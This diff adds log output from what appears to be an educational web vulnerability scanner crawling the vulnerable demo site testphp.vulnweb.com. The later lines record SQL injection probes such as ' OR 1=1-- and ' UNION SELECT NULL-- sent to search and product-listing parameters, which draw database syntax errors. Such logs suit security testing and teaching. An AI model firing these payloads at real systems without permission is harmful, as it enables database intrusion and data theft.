@@ -259,3 +259,1300 @@
 2025-11-05 23:03:13,926 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/?pp=12
 2025-11-05 23:03:18,582 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
 2025-11-05 23:03:27,179 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251105T173327Z.json', 'csv': 'reports\\edu_scan_report_20251105T173327Z.csv', 'html': 'reports\\edu_scan_report_20251105T173327Z.html', 'pdf': 'reports\\edu_scan_report_20251105T173327Z.pdf'}
+2025-11-06 11:01:31,843 INFO: Crawled: http://testphp.vulnweb.com/ (total 1)
+2025-11-06 11:01:32,659 INFO: Crawled: http://testphp.vulnweb.com/index.php (total 2)
+2025-11-06 11:01:33,441 INFO: Crawled: http://testphp.vulnweb.com/categories.php (total 3)
+2025-11-06 11:01:34,391 INFO: Crawled: http://testphp.vulnweb.com/artists.php (total 4)
+2025-11-06 11:01:35,173 INFO: Crawled: http://testphp.vulnweb.com/disclaimer.php (total 5)
+2025-11-06 11:01:36,140 INFO: Crawled: http://testphp.vulnweb.com/cart.php (total 6)
+2025-11-06 11:01:36,927 INFO: Crawled: http://testphp.vulnweb.com/guestbook.php (total 7)
+2025-11-06 11:01:37,722 INFO: Crawled: http://testphp.vulnweb.com/AJAX/index.php (total 8)
+2025-11-06 11:01:38,525 INFO: Crawled: http://testphp.vulnweb.com/login.php (total 9)
+2025-11-06 11:01:39,657 INFO: Crawled: http://testphp.vulnweb.com/userinfo.php (total 10)
+2025-11-06 11:01:41,411 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (total 11)
+2025-11-06 11:01:42,223 INFO: Crawled: http://testphp.vulnweb.com/hpp/ (total 12)
+2025-11-06 11:01:43,022 INFO: Crawled: http://testphp.vulnweb.com/search.php?test=query (total 13)
+2025-11-06 11:01:43,823 INFO: Crawled: http://testphp.vulnweb.com/style.css (total 14)
+2025-11-06 11:01:44,622 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=1 (total 15)
+2025-11-06 11:01:45,442 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=2 (total 16)
+2025-11-06 11:01:46,356 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=3 (total 17)
+2025-11-06 11:01:47,389 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=4 (total 18)
+2025-11-06 11:01:48,306 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=1 (total 19)
+2025-11-06 11:01:49,254 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=2 (total 20)
+2025-11-06 11:01:50,038 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=3 (total 21)
+2025-11-06 11:01:50,844 INFO: Crawled: http://testphp.vulnweb.com/AJAX/styles.css (total 22)
+2025-11-06 11:01:51,655 INFO: Crawled: http://testphp.vulnweb.com/signup.php (total 23)
+2025-11-06 11:01:52,422 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (total 24)
+2025-11-06 11:01:53,189 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (total 25)
+2025-11-06 11:01:53,989 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (total 26)
+2025-11-06 11:01:54,855 INFO: Crawled: http://testphp.vulnweb.com/hpp/?pp=12 (total 27)
+2025-11-06 11:01:55,709 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=1 (total 28)
+2025-11-06 11:01:56,839 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg (total 29)
+2025-11-06 11:01:57,754 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=2 (total 30)
+2025-11-06 11:01:58,537 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg (total 31)
+2025-11-06 11:01:59,334 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=3 (total 32)
+2025-11-06 11:02:00,139 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg (total 33)
+2025-11-06 11:02:01,116 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=4 (total 34)
+2025-11-06 11:02:02,220 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg (total 35)
+2025-11-06 11:02:02,987 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=5 (total 36)
+2025-11-06 11:02:04,023 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg (total 37)
+2025-11-06 11:02:04,784 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=7 (total 38)
+2025-11-06 11:02:05,878 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg (total 39)
+2025-11-06 11:02:06,686 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=6 (total 40)
+2025-11-06 11:02:19,367 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg (total 41)
+2025-11-06 11:02:20,152 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=1 (total 42)
+2025-11-06 11:02:20,968 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=2 (total 43)
+2025-11-06 11:02:21,756 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=3 (total 44)
+2025-11-06 11:02:22,568 INFO: Crawled: http://testphp.vulnweb.com/secured/newuser.php (total 45)
+2025-11-06 11:02:23,498 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/ (total 46)
+2025-11-06 11:02:24,319 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html (total 47)
+2025-11-06 11:02:25,250 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/ (total 48)
+2025-11-06 11:02:26,034 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html (total 49)
+2025-11-06 11:02:26,833 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/ (total 50)
+2025-11-06 11:02:27,633 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html (total 51)
+2025-11-06 11:02:28,453 INFO: Crawled: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12 (total 52)
+2025-11-06 11:02:29,249 INFO: Crawled: http://testphp.vulnweb.com/secured/style.css (total 53)
+2025-11-06 11:02:31,348 INFO: Found path: http://testphp.vulnweb.com/admin (status 200)
+2025-11-06 11:03:18,693 INFO: Testing parameters at: http://testphp.vulnweb.com/search.php?test=query
+2025-11-06 11:03:23,959 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-11-06 11:03:28,925 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=2
+2025-11-06 11:03:33,940 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=3
+2025-11-06 11:03:38,853 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=4
+2025-11-06 11:03:43,822 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=1
+2025-11-06 11:03:48,805 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=2
+2025-11-06 11:03:54,219 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=3
+2025-11-06 11:03:59,654 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/?pp=12
+2025-11-06 11:04:04,936 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=1
+2025-11-06 11:04:10,231 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
+2025-11-06 11:04:15,866 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=2
+2025-11-06 11:04:20,882 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
+2025-11-06 11:04:25,734 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=3
+2025-11-06 11:04:30,565 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
+2025-11-06 11:04:35,316 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=4
+2025-11-06 11:04:40,459 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
+2025-11-06 11:04:46,197 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=5
+2025-11-06 11:04:51,010 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
+2025-11-06 11:04:56,461 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=7
+2025-11-06 11:05:01,429 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
+2025-11-06 11:05:07,310 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=6
+2025-11-06 11:05:12,931 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
+2025-11-06 11:05:18,058 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=1
+2025-11-06 11:05:23,175 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=2
+2025-11-06 11:05:28,291 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?artist=3
+2025-11-06 11:05:33,091 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+2025-11-06 11:05:42,339 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251106T053542Z.json', 'csv': 'reports\\edu_scan_report_20251106T053542Z.csv', 'html': 'reports\\edu_scan_report_20251106T053542Z.html', 'pdf': 'reports\\edu_scan_report_20251106T053542Z.pdf'}
+2025-11-06 11:07:23,130 INFO: Crawled: http://testphp.vulnweb.com/ (total 1)
+2025-11-06 11:07:23,975 INFO: Crawled: http://testphp.vulnweb.com/index.php (total 2)
+2025-11-06 11:07:24,925 INFO: Crawled: http://testphp.vulnweb.com/categories.php (total 3)
+2025-11-06 11:07:25,724 INFO: Crawled: http://testphp.vulnweb.com/artists.php (total 4)
+2025-11-06 11:07:26,508 INFO: Crawled: http://testphp.vulnweb.com/disclaimer.php (total 5)
+2025-11-06 11:07:27,325 INFO: Crawled: http://testphp.vulnweb.com/cart.php (total 6)
+2025-11-06 11:07:28,124 INFO: Crawled: http://testphp.vulnweb.com/guestbook.php (total 7)
+2025-11-06 11:07:28,923 INFO: Crawled: http://testphp.vulnweb.com/AJAX/index.php (total 8)
+2025-11-06 11:07:29,675 INFO: Crawled: http://testphp.vulnweb.com/login.php (total 9)
+2025-11-06 11:07:30,724 INFO: Crawled: http://testphp.vulnweb.com/userinfo.php (total 10)
+2025-11-06 11:07:32,309 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (total 11)
+2025-11-06 11:07:33,107 INFO: Crawled: http://testphp.vulnweb.com/hpp/ (total 12)
+2025-11-06 11:07:34,057 INFO: Crawled: http://testphp.vulnweb.com/search.php?test=query (total 13)
+2025-11-06 11:07:34,857 INFO: Crawled: http://testphp.vulnweb.com/style.css (total 14)
+2025-11-06 11:07:35,640 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=1 (total 15)
+2025-11-06 11:07:36,444 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=2 (total 16)
+2025-11-06 11:07:37,225 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=3 (total 17)
+2025-11-06 11:07:38,062 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?cat=4 (total 18)
+2025-11-06 11:07:38,855 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=1 (total 19)
+2025-11-06 11:07:39,662 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=2 (total 20)
+2025-11-06 11:07:40,614 INFO: Crawled: http://testphp.vulnweb.com/artists.php?artist=3 (total 21)
+2025-11-06 11:07:41,390 INFO: Crawled: http://testphp.vulnweb.com/AJAX/styles.css (total 22)
+2025-11-06 11:07:42,179 INFO: Crawled: http://testphp.vulnweb.com/signup.php (total 23)
+2025-11-06 11:07:43,006 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (total 24)
+2025-11-06 11:07:43,792 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (total 25)
+2025-11-06 11:07:44,588 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (total 26)
+2025-11-06 11:07:45,356 INFO: Crawled: http://testphp.vulnweb.com/hpp/?pp=12 (total 27)
+2025-11-06 11:07:46,159 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=1 (total 28)
+2025-11-06 11:07:47,237 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg (total 29)
+2025-11-06 11:07:48,038 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=2 (total 30)
+2025-11-06 11:07:48,846 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg (total 31)
+2025-11-06 11:07:49,622 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=3 (total 32)
+2025-11-06 11:07:50,403 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg (total 33)
+2025-11-06 11:07:51,211 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=4 (total 34)
+2025-11-06 11:07:52,256 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg (total 35)
+2025-11-06 11:07:53,028 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=5 (total 36)
+2025-11-06 11:07:54,205 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg (total 37)
+2025-11-06 11:07:55,027 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=7 (total 38)
+2025-11-06 11:07:56,244 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg (total 39)
+2025-11-06 11:07:57,086 INFO: Crawled: http://testphp.vulnweb.com/product.php?pic=6 (total 40)
+2025-11-06 11:07:57,861 INFO: Crawled: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg (total 41)
+2025-11-06 11:07:58,678 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=1 (total 42)
+2025-11-06 11:07:59,493 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=2 (total 43)
+2025-11-06 11:08:00,458 INFO: Crawled: http://testphp.vulnweb.com/listproducts.php?artist=3 (total 44)
+2025-11-06 11:08:01,257 INFO: Crawled: http://testphp.vulnweb.com/secured/newuser.php (total 45)
+2025-11-06 11:08:02,070 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/ (total 46)
+2025-11-06 11:08:02,883 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html (total 47)
+2025-11-06 11:08:03,703 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/ (total 48)
+2025-11-06 11:08:04,503 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html (total 49)
+2025-11-06 11:08:05,320 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/ (total 50)
+2025-11-06 11:08:06,151 INFO: Crawled: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html (total 51)
+2025-11-06 11:08:06,951 INFO: Crawled: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12 (total 52)
+2025-11-06 11:08:07,718 INFO: Crawled: http://testphp.vulnweb.com/secured/style.css (total 53)
+2025-11-06 11:08:09,568 INFO: Found path: http://testphp.vulnweb.com/admin (status 200)
+2025-11-06 11:08:59,995 INFO: Testing parameters at: http://testphp.vulnweb.com/search.php?test=query
+2025-11-06 11:09:01,895 INFO: [SQLi] test=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27
+2025-11-06 11:09:01,895 INFO: [SQLi-LEN] test=' caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27
+2025-11-06 11:09:06,227 INFO: [SQLi] test=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27%29--
+2025-11-06 11:09:06,227 INFO: [SQLi-LEN] test=')-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27%29--
+2025-11-06 11:09:07,016 INFO: [SQLi] test=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27+UNION+SELECT+NULL--
+2025-11-06 11:09:07,016 INFO: [SQLi-LEN] test=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27+UNION+SELECT+NULL--
+2025-11-06 11:09:07,827 INFO: [SQLi] test=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/search.php?test=query%27+OR+1%3D1--
+2025-11-06 11:09:07,828 INFO: [SQLi-LEN] test=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/search.php?test=query%27+OR+1%3D1--
+2025-11-06 11:09:09,510 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-11-06 11:09:11,176 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27
+2025-11-06 11:09:11,177 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27
+2025-11-06 11:09:12,126 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271
+2025-11-06 11:09:12,126 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271
+2025-11-06 11:09:13,110 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22
+2025-11-06 11:09:13,111 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22
+2025-11-06 11:09:14,060 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%221%22%3D%221
+2025-11-06 11:09:14,061 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%221%22%3D%221
+2025-11-06 11:09:15,024 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%60
+2025-11-06 11:09:15,026 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%60
+2025-11-06 11:09:15,910 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27%29--
+2025-11-06 11:09:15,910 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27%29--
+2025-11-06 11:09:16,775 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+UNION+SELECT+NULL--
+2025-11-06 11:09:16,775 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+UNION+SELECT+NULL--
+2025-11-06 11:09:17,556 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--
+2025-11-06 11:09:17,557 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1--
+2025-11-06 11:09:18,375 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+1%3D1--
+2025-11-06 11:09:18,375 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+1%3D1--
+2025-11-06 11:09:19,158 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=2
+2025-11-06 11:09:20,758 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27
+2025-11-06 11:09:20,758 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27
+2025-11-06 11:09:21,574 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271
+2025-11-06 11:09:21,575 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271
+2025-11-06 11:09:22,524 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22
+2025-11-06 11:09:22,525 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22
+2025-11-06 11:09:23,292 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%221%22%3D%221
+2025-11-06 11:09:23,292 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%221%22%3D%221
+2025-11-06 11:09:24,139 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%60
+2025-11-06 11:09:24,141 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%60
+2025-11-06 11:09:25,091 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27%29--
+2025-11-06 11:09:25,091 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27%29--
+2025-11-06 11:09:25,908 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+UNION+SELECT+NULL--
+2025-11-06 11:09:25,909 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+UNION+SELECT+NULL--
+2025-11-06 11:09:26,856 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1--
+2025-11-06 11:09:26,857 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1--
+2025-11-06 11:09:27,808 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+1%3D1--
+2025-11-06 11:09:27,808 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+1%3D1--
+2025-11-06 11:09:28,607 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=3
+2025-11-06 11:09:30,356 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27
+2025-11-06 11:09:30,357 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27
+2025-11-06 11:09:31,173 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271
+2025-11-06 11:09:31,174 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271
+2025-11-06 11:09:32,140 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22
+2025-11-06 11:09:32,141 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22
+2025-11-06 11:09:33,021 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%221%22%3D%221
+2025-11-06 11:09:33,021 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%221%22%3D%221
+2025-11-06 11:09:33,840 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%60
+2025-11-06 11:09:33,840 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%60
+2025-11-06 11:09:34,674 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27%29--
+2025-11-06 11:09:34,674 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27%29--
+2025-11-06 11:09:35,489 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+UNION+SELECT+NULL--
+2025-11-06 11:09:35,490 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+UNION+SELECT+NULL--
+2025-11-06 11:09:36,456 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1--
+2025-11-06 11:09:36,457 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1--
+2025-11-06 11:09:37,257 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+1%3D1--
+2025-11-06 11:09:37,257 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+1%3D1--
+2025-11-06 11:09:38,539 INFO: Testing parameters at: http://testphp.vulnweb.com/listproducts.php?cat=4
+2025-11-06 11:09:40,139 INFO: [SQLi] cat=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27
+2025-11-06 11:09:40,139 INFO: [SQLi-LEN] cat=' caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27
+2025-11-06 11:09:40,957 INFO: [SQLi] cat=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271
+2025-11-06 11:09:40,957 INFO: [SQLi-LEN] cat=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271
+2025-11-06 11:09:41,905 INFO: [SQLi] cat=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22
+2025-11-06 11:09:41,906 INFO: [SQLi-LEN] cat=" caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22
+2025-11-06 11:09:42,855 INFO: [SQLi] cat=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%221%22%3D%221
+2025-11-06 11:09:42,856 INFO: [SQLi-LEN] cat=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%221%22%3D%221
+2025-11-06 11:09:43,805 INFO: [SQLi] cat=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%60
+2025-11-06 11:09:43,806 INFO: [SQLi-LEN] cat=` caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%60
+2025-11-06 11:09:44,605 INFO: [SQLi] cat=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27%29--
+2025-11-06 11:09:44,606 INFO: [SQLi-LEN] cat=')-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27%29--
+2025-11-06 11:09:45,571 INFO: [SQLi] cat=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+UNION+SELECT+NULL--
+2025-11-06 11:09:45,572 INFO: [SQLi-LEN] cat=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+UNION+SELECT+NULL--
+2025-11-06 11:09:46,371 INFO: [SQLi] cat=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1--
+2025-11-06 11:09:46,372 INFO: [SQLi-LEN] cat=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1--
+2025-11-06 11:09:47,338 INFO: [SQLi] cat=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+1%3D1--
+2025-11-06 11:09:47,339 INFO: [SQLi-LEN] cat=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+1%3D1--
